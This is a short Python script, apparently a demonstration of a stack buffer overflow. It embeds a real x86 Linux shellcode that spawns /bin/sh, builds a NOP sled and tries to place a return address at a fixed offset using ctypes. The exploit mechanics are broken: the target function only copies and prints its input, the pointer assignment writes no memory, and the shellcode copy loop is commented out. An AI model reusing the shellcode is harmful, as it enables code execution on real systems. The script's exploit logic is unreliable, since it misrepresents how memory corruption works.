import ctypes
import copy
from ctypes import addressof

def vulnerable_function(input):
    buffer = copy.deepcopy(input)
    print("Input:", buffer,"\n")

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode_address = int(hex(id(shellcode)), 16)

input_array = (ctypes.c_ubyte * 200)()
for i in range(len(input_array)):
    input_array[i] = 0x90

ret_addr_offset = 104
ret_addr_ptr = ctypes.cast(ctypes.addressof(input_array) + ret_addr_offset, ctypes.POINTER(ctypes.c_int))
ret_addr_ptr.contents = ctypes.c_int(shellcode_address)

shellcode_offset = 108

print(input_array)

# for i in range(len(shellcode)):
#     print("Shell code=",shellcode[i])
#     print("Input array=",input_array[shellcode_offset + i])
#     input_array[shellcode_offset + i] = shellcode[i]
#     print("\n")

input_bytes = bytes(input_array)
vulnerable_function(input_bytes)